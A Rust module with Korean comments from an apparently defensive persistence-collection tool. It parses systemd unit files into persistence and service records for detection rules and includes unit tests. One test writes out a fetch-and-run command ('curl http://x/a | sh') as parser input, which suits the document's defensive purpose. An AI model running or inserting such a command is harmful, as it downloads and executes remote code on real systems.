//! systemd 유닛 파싱 (설계-09 P12).
//!
//! # 어디를 보는가
//!
//! cron 과 같은 이유로 자리가 정해져 있다. 우선순위가 낮은 곳부터 높은 곳
//! 순서인데, **덮어쓰기를 흉내 내지 않는다** — 같은 이름의 유닛이 여러 곳에
//! 있으면 전부 담는다. 실제로 도는 것은 하나지만, *"공격자가 벤더 유닛과 같은
//! 이름을 `/etc` 에 놓아 가로챘다"* 는 사실 자체가 증거이기 때문이다.
//!
//! # `enabled` 는 파일 안에 없다
//!
//! systemd 에서 "활성화" 는 `<target>.wants/` 아래의 심볼릭 링크다. 유닛 파일만
//! 읽고 `[Install] WantedBy=` 를 보면 **활성화될 수 있다**는 뜻이지 활성화되어
//! 있다는 뜻이 아니다. 그래서 링크를 따로 훑어 확인한다 — 없는 것을 있는 것으로
//! 보고하는 쪽이 오탐이고, 그 반대는 미탐이다.

use remedy_artifacts::{PersistenceRecord, ServiceRecord};

/// 시스템 유닛이 사는 자리. 뒤로 갈수록 우선순위가 높다.
pub(crate) const SYSTEM_DIRS: [&str; 4] = [
    "/usr/lib/systemd/system",
    "/lib/systemd/system",
    "/run/systemd/system",
    "/etc/systemd/system",
];

/// 사용자 유닛이 사는 자리. `%HOME%` 아래는 호출자가 사용자마다 붙인다.
pub(crate) const USER_DIRS: [&str; 3] = [
    "/usr/lib/systemd/user",
    "/etc/systemd/user",
    "/run/systemd/user",
];

/// 유닛 파일에서 읽어 낸 것.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct ParsedUnit {
    /// `[Service] ExecStart=` 의 첫 낱말.
    pub command: String,
    pub args: String,
    /// `[Service] User=`. 없으면 시스템 유닛은 root, 사용자 유닛은 그 사용자다.
    pub user: Option<String>,
    /// `[Install] WantedBy=` 전부.
    pub wanted_by: Vec<String>,
    /// `[Timer]` 의 일정 지시자 이름들. `OnCalendar` · `OnBootSec` 등.
    pub timer_keys: Vec<String>,
    /// `[Unit] Description=`.
    pub description: String,
}

/// 유닛 파일 하나를 읽는다.
///
/// # 파싱은 방어적으로 한다
///
/// 남이 쓴 파일이다. 모르는 절·모르는 키는 **버리지 않고 건너뛴다** — 거부하면
/// 배포판이 확장한 유닛 하나 때문에 수집 전체가 멈춘다.
pub fn parse(text: &str) -> ParsedUnit {
    let mut u = ParsedUnit::default();
    let mut section = String::new();
    // `\` 로 이어진 줄. systemd 는 이것을 한 줄로 읽으므로 우리도 그래야
    // `ExecStart=/bin/sh \` + `  -c 'evil'` 이 두 항목으로 갈라지지 않는다.
    let mut pending = String::new();

    for raw in text.lines() {
        let line = raw.trim();
        if !pending.is_empty() {
            pending.push(' ');
            pending.push_str(line);
            if line.ends_with('\\') {
                pending.pop();
                continue;
            }
        } else {
            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
                continue;
            }
            if line.starts_with('[') && line.ends_with(']') {
                section = line[1..line.len() - 1].to_ascii_lowercase();
                continue;
            }
            if let Some(head) = line.strip_suffix('\\') {
                pending = head.trim_end().to_string();
                continue;
            }
            pending = line.to_string();
        }

        let joined = std::mem::take(&mut pending);
        let Some((key, value)) = joined.split_once('=') else {
            continue;
        };
        let key = key.trim();
        let value = value.trim();

        match (section.as_str(), key) {
            ("unit", "Description") => u.description = value.to_string(),
            ("service", "ExecStart") => {
                // 접두 문자(`-` 실패 무시 · `@` argv[0] 지정 · `+`·`!` 권한)는
                // 실행 파일의 일부가 아니다. 남겨 두면 `command` 가 실제 경로와
                // 달라져 룰이 빗나간다.
                let v = value.trim_start_matches(['-', '@', '+', '!', ':']);
                let mut it = v.split_whitespace();
                if let Some(c) = it.next() {
                    // 이미 하나 읽었으면 덮어쓰지 않는다. `ExecStart=` 가 여럿인
                    // 유닛(`Type=oneshot`)에서 마지막만 남으면 앞의 것이 사라진다.
                    if u.command.is_empty() {
                        u.command = c.to_string();
                        u.args = it.collect::<Vec<_>>().join(" ");
                    }
                }
            }
            ("service", "User") => u.user = Some(value.to_string()),
            ("install", "WantedBy" | "RequiredBy") => {
                u.wanted_by
                    .extend(value.split_whitespace().map(|s| s.to_string()));
            }
            (
                "timer",
                k @ ("OnCalendar" | "OnBootSec" | "OnStartupSec" | "OnActiveSec"
                | "OnUnitActiveSec" | "OnUnitInactiveSec"),
            ) => u.timer_keys.push(k.to_string()),
            _ => {}
        }
    }
    u
}

/// 유닛을 Windows 와 **같은 낱말**의 유발 조건으로 옮긴다.
///
/// 새 낱말을 만들지 않는 이유는 cron 쪽과 같다 — `trigger contains "boot"` 로
/// 쓴 룰이 플랫폼을 넘어 통해야 한다.
pub fn triggers(u: &ParsedUnit, user_unit: bool) -> Vec<String> {
    let mut out = Vec::new();
    for k in &u.timer_keys {
        out.push(
            match k.as_str() {
                "OnBootSec" | "OnStartupSec" => "boot",
                "OnCalendar" => "calendar",
                _ => "time",
            }
            .to_string(),
        );
    }
    for w in &u.wanted_by {
        // 사용자 유닛의 `default.target` 은 **로그온**에 걸린다. 시스템 유닛의
        // 그것과 뜻이 다르므로 갈라야 한다.
        out.push(if user_unit { "logon" } else { "boot" }.to_string());
        let _ = w;
    }
    out.sort();
    out.dedup();
    out
}

/// 유닛 하나를 레코드로.
///
/// # `id` 는 유닛 **파일 경로**다
///
/// 처음에는 유닛 이름으로 두었다 — `systemctl` 이 그것으로 지목하고 사람이
/// 그것으로 부르기 때문이다. **실측에서 그것이 틀렸다.** 계획기는 `id` 를 그대로
/// 대상으로 쓰고, 쓰기 경계는 그 대상으로 파일을 연다. 이름만 오면 실행기가
/// 유닛 파일을 찾아 헤매야 하는데 **쓰기 경계는 탐색하지 않는다**(불변식 P).
///
/// 사람이 부르는 이름은 `name` 에 남는다. 같은 이름의 유닛이 여러 자리에 있으면
/// `id` 가 갈리는데, 그것이 **가로채기가 일어났다는 사실 자체**다 — 이름으로
/// 두었다면 둘이 한 항목으로 뭉쳐 그 사실이 사라졌다.
pub fn to_record(
    u: ParsedUnit,
    source: &str,
    user_unit: bool,
    owner: Option<&str>,
    enabled: bool,
) -> PersistenceRecord {
    use remedy_sdk::normalize;
    let name = source.rsplit('/').next().unwrap_or(source).to_string();
    let principal = u
        .user
        .clone()
        .or_else(|| owner.map(|s| s.to_string()))
        .or_else(|| (!user_unit).then(|| "root".to_string()));
    PersistenceRecord {
        id: source.to_string(),
        name,
        enabled,
        trigger: triggers(&u, user_unit),
        command: normalize::nfc(&u.command),
        args: normalize::nfc(&u.args),
        principal,
        source: source.to_string(),
        win: None,
        // 유닛은 **파일 하나**다. 줄 자리가 없다.
        linux: None,
    }
}

/// 유닛 하나를 **서비스** 레코드로.
///
/// # `.service` 는 `service` subject 다
///
/// 카탈로그의 요약이 처음부터 그렇게 적고 있다 — `persistence` 는
/// *"예약 작업 · cron · systemd **timer**"*, `service` 는 *"Windows 서비스 ·
/// systemd **service** · SysV init"*. 둘을 한 subject 에 담으면 `service.*` Op
/// 넷이 도달할 수 없게 되고, 룰 작성자는 `systemctl` 이 부르는 이름과 다른
/// subject 를 써야 한다 (설계-09 P12 순서 9).
///
/// # `id` 가 파일 경로인 이유
///
/// [`ServiceRecord`] 에는 `source` 가 없다. 계획기가 대상을 정하려면 그 자리가
/// `id` 뿐이고, **이름만으로는 실행기가 유닛 파일을 찾아 헤매야 한다** — 쓰기
/// 경계는 탐색하지 않는다 (불변식 P). 사람이 부르는 이름은 `name` 에 남는다.
pub fn to_service_record(u: ParsedUnit, source: &str, enabled: bool) -> ServiceRecord {
    use remedy_sdk::normalize;
    let name = source.rsplit('/').next().unwrap_or(source).to_string();
    ServiceRecord {
        id: source.to_string(),
        name,
        // **돌고 있는지는 파일에 없다.** Windows 수집기가 레지스트리만 보고
        // `unknown` 을 적는 것과 같다 — 없는 것을 "정지" 로 적으면 돌고 있는
        // 악성 서비스가 멈춘 것으로 보고된다.
        state: "unknown".into(),
        start_type: if enabled {
            "enabled".into()
        } else if u.wanted_by.is_empty() {
            // `[Install]` 이 없는 유닛은 켤 수 있는 것이 아니다. 다른 유닛이
            // 끌어올릴 때만 돈다 — systemd 가 `static` 이라 부른다.
            "static".into()
        } else {
            "disabled".into()
        },
        image_path: normalize::nfc(&u.command),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SERVICE: &str = "\
[Unit]
Description=Example updater

[Service]
Type=simple
User=analyst
ExecStart=-/home/analyst/.local/bin/upd --daemon

[Install]
WantedBy=multi-user.target
";

    #[test]
    fn exec_start_prefix_characters_are_not_part_of_the_path() {
        // `-` 는 "실패해도 무시" 라는 지시자다. 남겨 두면 `command` 가
        // `-/home/...` 이 되어 경로로 매치하는 룰이 전부 빗나간다.
        let u = parse(SERVICE);
        assert_eq!(u.command, "/home/analyst/.local/bin/upd");
        assert_eq!(u.args, "--daemon");
        assert_eq!(u.user.as_deref(), Some("analyst"));
        assert_eq!(u.wanted_by, vec!["multi-user.target"]);
    }

    #[test]
    fn a_continued_line_is_one_directive() {
        // systemd 가 한 줄로 읽는다. 갈라 읽으면 `-c` 부터가 사라지고, 룰이
        // 겨누는 것은 대개 그 뒤에 있다.
        let u = parse("[Service]\nExecStart=/bin/sh \\\n  -c 'curl http://x/a | sh'\n");
        assert_eq!(u.command, "/bin/sh");
        assert_eq!(u.args, "-c 'curl http://x/a | sh'");
    }

    #[test]
    fn the_first_exec_start_wins() {
        // `Type=oneshot` 은 `ExecStart=` 를 여럿 둘 수 있다. 마지막만 남기면
        // 먼저 도는 것이 사라진다.
        let u = parse("[Service]\nExecStart=/first\nExecStart=/second\n");
        assert_eq!(u.command, "/first");
    }

    #[test]
    fn an_unknown_section_does_not_stop_the_parse() {
        // 배포판이 확장한 절 하나 때문에 수집 전체가 멈추면 안 된다.
        let u = parse("[Unit]\nDescription=x\n\n[Deb-Extra]\nFoo=bar\n\n[Service]\nExecStart=/y\n");
        assert_eq!(u.description, "x");
        assert_eq!(u.command, "/y");
    }

    #[test]
    fn comments_are_skipped_in_both_styles() {
        let u = parse("[Service]\n# ExecStart=/commented\n; ExecStart=/also\nExecStart=/real\n");
        assert_eq!(u.command, "/real");
    }

    #[test]
    fn a_timer_maps_onto_the_same_trigger_words_windows_uses() {
        // 새 낱말을 만들면 `trigger contains "boot"` 로 쓴 룰이 Linux 에서
        // 안 맞는다.
        let u = parse("[Timer]\nOnBootSec=5min\nOnUnitActiveSec=1h\n");
        assert_eq!(triggers(&u, false), vec!["boot", "time"]);
        let c = parse("[Timer]\nOnCalendar=daily\n");
        assert_eq!(triggers(&c, false), vec!["calendar"]);
    }

    #[test]
    fn a_user_unit_wanted_by_default_target_is_a_logon_trigger() {
        // 사용자 유닛의 `default.target` 은 로그온에 걸린다. 시스템 유닛의
        // 그것과 뜻이 다르다.
        let u = parse("[Install]\nWantedBy=default.target\n");
        assert_eq!(triggers(&u, true), vec!["logon"]);
        assert_eq!(triggers(&u, false), vec!["boot"]);
    }

    #[test]
    fn a_system_unit_without_a_user_runs_as_root() {
        // 비어 있는 `principal` 은 "모른다" 로 읽힌다. 시스템 유닛의 기본값은
        // 모르는 것이 아니라 root 다.
        let r = to_record(
            parse("[Service]\nExecStart=/x\n"),
            "/etc/systemd/system/a.service",
            false,
            None,
            true,
        );
        assert_eq!(r.principal.as_deref(), Some("root"));
        // **`id` 는 파일 경로다.** 계획기가 이것을 대상으로 쓰고 쓰기 경계가
        // 그 대상으로 파일을 연다 — 이름만 오면 찾아 헤매야 한다.
        assert_eq!(r.id, "/etc/systemd/system/a.service");
        assert_eq!(r.name, "a.service");
        assert_eq!(r.source, "/etc/systemd/system/a.service");
    }

    #[test]
    fn a_user_unit_belongs_to_its_owner() {
        let r = to_record(
            parse("[Service]\nExecStart=/x\n"),
            "/home/analyst/.config/systemd/user/a.service",
            true,
            Some("analyst"),
            false,
        );
        assert_eq!(r.principal.as_deref(), Some("analyst"));
        assert!(!r.enabled);
    }
}
